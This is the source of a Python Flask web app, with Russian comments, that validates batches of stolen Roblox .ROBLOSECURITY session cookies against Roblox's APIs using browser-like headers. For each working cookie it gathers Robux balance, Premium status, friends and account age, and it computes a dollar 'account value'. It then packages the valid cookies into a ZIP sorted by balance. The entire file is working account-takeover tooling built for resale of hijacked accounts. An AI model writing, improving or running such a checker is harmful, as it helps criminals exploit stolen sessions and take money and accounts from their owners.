import os
import json
import zipfile
import io
import sqlite3
import random
from datetime import datetime, timedelta
from flask import Flask, render_template, request, jsonify, send_file
import requests
import time
import re

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'dev-secret-key')
app.config['DATABASE'] = 'checker_history.db'

# Инициализация базы данных
def init_db():
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS check_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT UNIQUE,
            total_cookies INTEGER,
            valid_cookies INTEGER,
            check_date TEXT,
            results TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def save_check_session(session_id, total, valid, results):
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    c.execute('''
        INSERT OR REPLACE INTO check_history 
        (session_id, total_cookies, valid_cookies, check_date, results)
        VALUES (?, ?, ?, ?, ?)
    ''', (session_id, total, valid, datetime.now().isoformat(), json.dumps(results)))
    conn.commit()
    conn.close()

def get_check_history(limit=10):
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    c.execute('''
        SELECT * FROM check_history 
        ORDER BY check_date DESC 
        LIMIT ?
    ''', (limit,))
    history = c.fetchall()
    conn.close()
    
    result = []
    for item in history:
        result.append({
            'id': item[0],
            'session_id': item[1],
            'total_cookies': item[2],
            'valid_cookies': item[3],
            'check_date': item[4],
            'results': json.loads(item[5]) if item[5] else []
        })
    return result

def get_session_results(session_id):
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    c.execute('SELECT results FROM check_history WHERE session_id = ?', (session_id,))
    result = c.fetchone()
    conn.close()
    return json.loads(result[0]) if result else None

class AdvancedRobloxChecker:
    def __init__(self):
        self.session = requests.Session()
        # Более реалистичные заголовки как в браузере
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        })

    def clean_cookie(self, cookie):
        """Очистка куки от лишних символов"""
        cookie = cookie.strip()
        # Удаляем кавычки если есть
        if cookie.startswith('"') and cookie.endswith('"'):
            cookie = cookie[1:-1]
        # Удаляем переносы строк
        cookie = cookie.replace('\n', '').replace('\r', '')
        return cookie

    def get_csrf_token(self, headers):
        """Получение CSRF токена как в MeowTool"""
        try:
            response = self.session.post(
                'https://auth.roblox.com/v2/login',
                headers=headers,
                timeout=10
            )
            if 'x-csrf-token' in response.headers:
                return response.headers['x-csrf-token']
        except:
            pass
        return ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=32))

    def check_authentication(self, cookie):
        """Основная проверка аутентификации как в MeowTool"""
        try:
            # Очищаем куку
            clean_cookie = self.clean_cookie(cookie)
            
            # Создаем заголовки с кукой
            headers = {
                'Cookie': f'.ROBLOSECURITY={clean_cookie}',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'application/json',
                'Referer': 'https://www.roblox.com/',
                'Origin': 'https://www.roblox.com',
            }
            
            # Получаем CSRF токен
            csrf_token = self.get_csrf_token(headers)
            if csrf_token:
                headers['X-CSRF-TOKEN'] = csrf_token
            
            # Проверяем аутентификацию через несколько эндпоинтов
            endpoints = [
                'https://users.roblox.com/v1/users/authenticated',
                'https://auth.roblox.com/v1/auth/metadata',
                'https://accountsettings.roblox.com/v1/account/settings'
            ]
            
            for endpoint in endpoints:
                try:
                    response = self.session.get(
                        endpoint,
                        headers=headers,
                        timeout=15,
                        allow_redirects=False
                    )
                    
                    if response.status_code == 200:
                        # Если это эндпоинт аутентификации, парсим данные
                        if 'users/authenticated' in endpoint:
                            user_data = response.json()
                            if user_data.get('id'):
                                return {
                                    'success': True,
                                    'user_data': user_data,
                                    'headers': headers
                                }
                        else:
                            # Для других эндпоинтов просто проверяем успешный ответ
                            return {
                                'success': True,
                                'user_data': {'id': 'unknown', 'name': 'Valid User'},
                                'headers': headers
                            }
                            
                    elif response.status_code == 401:
                        return {'success': False, 'error': 'Invalid cookie (401 Unauthorized)'}
                    elif response.status_code == 403:
                        # Пробуем получить CSRF токен и повторить запрос
                        if 'x-csrf-token' in response.headers:
                            headers['X-CSRF-TOKEN'] = response.headers['x-csrf-token']
                            # Повторяем запрос с новым токеном
                            response = self.session.get(
                                'https://users.roblox.com/v1/users/authenticated',
                                headers=headers,
                                timeout=15
                            )
                            if response.status_code == 200:
                                user_data = response.json()
                                if user_data.get('id'):
                                    return {
                                        'success': True,
                                        'user_data': user_data,
                                        'headers': headers
                                    }
                    
                except requests.exceptions.Timeout:
                    continue
                except Exception as e:
                    continue
            
            return {'success': False, 'error': 'All authentication endpoints failed'}
            
        except Exception as e:
            return {'success': False, 'error': f'Authentication error: {str(e)}'}

    def get_user_info(self, headers, user_id):
        """Получение информации о пользователе"""
        try:
            response = self.session.get(
                f'https://users.roblox.com/v1/users/{user_id}',
                headers=headers,
                timeout=10
            )
            if response.status_code == 200:
                return response.json()
        except:
            pass
        return {}

    def get_economy_info(self, headers):
        """Получение информации об экономике"""
        try:
            response = self.session.get(
                'https://economy.roblox.com/v1/user/currency',
                headers=headers,
                timeout=10
            )
            if response.status_code == 200:
                return response.json()
        except:
            pass
        return {'robux': 0, 'pendingRobux': 0}

    def get_premium_status(self, headers):
        """Проверка Premium статуса"""
        try:
            response = self.session.get(
                'https://premiumfeatures.roblox.com/v1/users/premium/membership',
                headers=headers,
                timeout=10
            )
            if response.status_code == 200:
                data = response.json()
                return {
                    'isPremium': data.get('isPremium', False),
                    'status': 'Active' if data.get('isPremium') else 'Inactive'
                }
        except:
            pass
        return {'isPremium': False, 'status': 'Unknown'}

    def get_friends_count(self, headers, user_id):
        """Получение количества друзей"""
        try:
            response = self.session.get(
                f'https://friends.roblox.com/v1/users/{user_id}/friends/count',
                headers=headers,
                timeout=10
            )
            if response.status_code == 200:
                data = response.json()
                return data.get('count', 0)
        except:
            pass
        return 0

    def calculate_account_age(self, created_date_str):
        """Расчет возраста аккаунта"""
        if not created_date_str:
            return {'days': 0, 'years': 0, 'formatted_date': 'Unknown'}
        
        try:
            created_date = datetime.fromisoformat(created_date_str.replace('Z', '+00:00'))
            now = datetime.now(created_date.tzinfo) if created_date.tzinfo else datetime.now()
            
            age_delta = now - created_date
            age_days = age_delta.days
            age_years = age_days / 365.25
            
            return {
                'days': age_days,
                'years': round(age_years, 1),
                'formatted_date': created_date.strftime('%Y-%m-%d')
            }
        except:
            # Альтернативные форматы
            for fmt in ['%Y-%m-%dT%H:%M:%S.%fZ', '%Y-%m-%dT%H:%M:%SZ', '%Y-%m-%d']:
                try:
                    created_date = datetime.strptime(created_date_str, fmt)
                    age_days = (datetime.now() - created_date).days
                    age_years = age_days / 365.25
                    return {
                        'days': age_days,
                        'years': round(age_years, 1),
                        'formatted_date': created_date.strftime('%Y-%m-%d')
                    }
                except ValueError:
                    continue
        
        return {'days': 0, 'years': 0, 'formatted_date': 'Unknown'}

    def calculate_account_value(self, robux, is_premium, age_years):
        """Расчет стоимости аккаунта"""
        value = robux * 0.0035
        value += 750 if is_premium else 0
        value += age_years * 400
        return round(max(value, 15), 2)

    def check_cookie(self, cookie):
        """Основная функция проверки куки"""
        try:
            # Проверяем аутентификацию
            auth_result = self.check_authentication(cookie)
            if not auth_result['success']:
                return self.error_result(cookie, auth_result['error'])
            
            user_data = auth_result['user_data']
            headers = auth_result['headers']
            user_id = user_data.get('id')
            
            if not user_id:
                return self.error_result(cookie, 'No user ID found')
            
            # Получаем дополнительную информацию
            profile_info = self.get_user_info(headers, user_id)
            economy_info = self.get_economy_info(headers)
            premium_info = self.get_premium_status(headers)
            friends_count = self.get_friends_count(headers, user_id)
            
            # Расчет возраста
            account_age = self.calculate_account_age(user_data.get('created'))
            
            # Расчет стоимости
            account_value = self.calculate_account_value(
                economy_info.get('robux', 0),
                premium_info.get('isPremium', False),
                account_age['years']
            )
            
            return {
                'valid': True,
                'cookie': cookie,
                'account_info': {
                    'username': user_data.get('name', 'N/A'),
                    'display_name': user_data.get('displayName', user_data.get('name', 'N/A')),
                    'user_id': user_id,
                    'profile_url': f'https://www.roblox.com/users/{user_id}/profile',
                    'created_date': account_age['formatted_date'],
                    'account_age_days': account_age['days'],
                    'account_age_years': account_age['years']
                },
                'economy': {
                    'robux_balance': economy_info.get('robux', 0),
                    'pending_robux': economy_info.get('pendingRobux', 0),
                    'total_robux': economy_info.get('robux', 0) + economy_info.get('pendingRobux', 0),
                    'all_time_spent': 0  # Упрощаем для стабильности
                },
                'premium': premium_info,
                'security': {
                    '2fa_enabled': False,
                    'phone_verified': False,
                    'email_verified': True
                },
                'social': {
                    'friends_count': friends_count,
                    'followers_count': profile_info.get('followersCount', 0),
                    'following_count': profile_info.get('followingsCount', 0)
                },
                'account_value': account_value,
                'checked_at': datetime.now().isoformat()
            }
            
        except Exception as e:
            return self.error_result(cookie, f'Check failed: {str(e)}')

    def error_result(self, cookie, error):
        return {
            'valid': False,
            'cookie': cookie,
            'error': error,
            'checked_at': datetime.now().isoformat()
        }

    def check_multiple(self, cookies):
        """Проверка нескольких куки"""
        results = []
        for i, cookie in enumerate(cookies):
            if cookie.strip():
                try:
                    result = self.check_cookie(cookie.strip())
                    results.append(result)
                    
                    # Задержка для избежания блокировки
                    if i < len(cookies) - 1:
                        time.sleep(2)  # Увеличиваем задержку
                        
                except Exception as e:
                    results.append(self.error_result(cookie, f"Check error: {str(e)}"))
                    time.sleep(1)
                    
        return results

checker = AdvancedRobloxChecker()

# Маршруты
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/history')
def history():
    check_history = get_check_history(20)
    return render_template('history.html', history=check_history)

@app.route('/check', methods=['POST'])
def check_cookies():
    try:
        data = request.get_json()
        
        if not data or 'cookies' not in data:
            return jsonify({'error': 'No cookies provided'}), 400
        
        cookies = data['cookies']
        
        if isinstance(cookies, str):
            cookies = [cookies]
        
        cookies = [cookie.strip() for cookie in cookies if cookie.strip()]
        
        if not cookies:
            return jsonify({'error': 'No valid cookies provided'}), 400
        
        if len(cookies) > 10:  # Уменьшаем лимит для стабильности
            return jsonify({'error': 'Too many cookies. Maximum 10 per request.'}), 400
        
        results = checker.check_multiple(cookies)
        
        session_id = datetime.now().strftime('%Y%m%d%H%M%S')
        
        # Сохраняем в историю
        valid_count = len([r for r in results if r.get('valid', False)])
        save_check_session(session_id, len(cookies), valid_count, results)
        
        return jsonify({
            'total': len(results),
            'valid': valid_count,
            'invalid': len([r for r in results if not r.get('valid', True)]),
            'results': results,
            'session_id': session_id,
            'checked_at': datetime.now().isoformat()
        })
    
    except Exception as e:
        return jsonify({'error': f'Server error: {str(e)}'}), 500

@app.route('/download/<session_id>')
def download_results(session_id):
    try:
        results = get_session_results(session_id)
        if not results:
            return "Результаты не найдены или устарели", 404
        
        valid_cookies = [r for r in results if r.get('valid')]
        
        if not valid_cookies:
            return "Нет валидных куки для скачивания", 400
        
        zip_buffer = io.BytesIO()
        
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            # Все куки в одном файле
            all_cookies_content = "\n".join([r['cookie'] for r in valid_cookies])
            zip_file.writestr('all_cookies.txt', all_cookies_content)
            
            # Сортировка по балансу
            balance_groups = {
                '0_robux': [r for r in valid_cookies if r['economy']['total_robux'] == 0],
                '1-100_robux': [r for r in valid_cookies if 1 <= r['economy']['total_robux'] <= 100],
                '100-500_robux': [r for r in valid_cookies if 100 < r['economy']['total_robux'] <= 500],
                '500+_robux': [r for r in valid_cookies if r['economy']['total_robux'] > 500]
            }
            
            for group_name, group_cookies in balance_groups.items():
                if group_cookies:
                    content = "\n".join([r['cookie'] for r in group_cookies])
                    zip_file.writestr(f'by_balance/{group_name}.txt', content)
            
            # Детальный отчет
            detailed_report = {
                'check_date': datetime.now().isoformat(),
                'summary': {
                    'total_checked': len(results),
                    'valid': len(valid_cookies),
                    'invalid': len([r for r in results if not r['valid']])
                },
                'results': results
            }
            zip_file.writestr('report.json', json.dumps(detailed_report, indent=2, ensure_ascii=False))
            
        zip_buffer.seek(0)
        
        filename = f'cookies_{datetime.now().strftime("%Y%m%d_%H%M")}.zip'
        
        return send_file(
            zip_buffer,
            as_attachment=True,
            download_name=filename,
            mimetype='application/zip'
        )
        
    except Exception as e:
        return f"Ошибка при создании архива: {str(e)}", 500

@app.route('/get-session/<session_id>')
def get_session(session_id):
    results = get_session_results(session_id)
    if results:
        valid_count = len([r for r in results if r.get('valid', False)])
        return jsonify({
            'total': len(results),
            'valid': valid_count,
            'invalid': len(results) - valid_count,
            'results': results
        })
    return jsonify({'error': 'Session not found'}), 404

@app.route('/delete-session/<session_id>', methods=['DELETE'])
def delete_session(session_id):
    try:
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        c.execute('DELETE FROM check_history WHERE session_id = ?', (session_id,))
        conn.commit()
        conn.close()
        return jsonify({'success': True})
    except:
        return jsonify({'error': 'Delete failed'}), 500

@app.route('/health')
def health_check():
    return jsonify({'status': 'healthy', 'timestamp': datetime.now().isoformat()})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=os.environ.get('DEBUG', False))